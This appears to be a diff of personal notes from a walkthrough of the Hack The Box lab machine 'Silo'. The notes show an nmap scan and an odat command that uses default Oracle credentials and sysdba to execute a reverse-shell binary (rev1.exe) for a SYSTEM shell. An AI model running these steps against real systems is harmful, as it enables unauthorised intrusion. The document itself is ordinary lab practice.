@@ -1,6 +1,5 @@
 ``` SILO - 10.10.10.82```
 
-## NMAP
 ```
 nmap -sS -p- -v 10.10.10.82 
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-10 03:43 EDT
@@ -182,6 +181,8 @@ Learn that there are 2 oracle listeners here
 
 ```Odat```
 
+-- sysdba is like sudo
+
 ```
 https://github.com/quentinhardy/odat
 ```
@@ -193,7 +194,11 @@ https://github.com/quentinhardy/odat
 ```
 ./odat-libc2.12-x86_64 externaltable -s 10.10.10.82 -d XE -U Scott -P tiger --sysdba --exec "C:\Windows\Temp" rev1.exe
 ```
+--- I get a direct system shell coz of the fact that the oracle db is running with system privileges
 
+
+
+- The file I used to crack the password is accounts.txt
 
 ```
 File Sharing
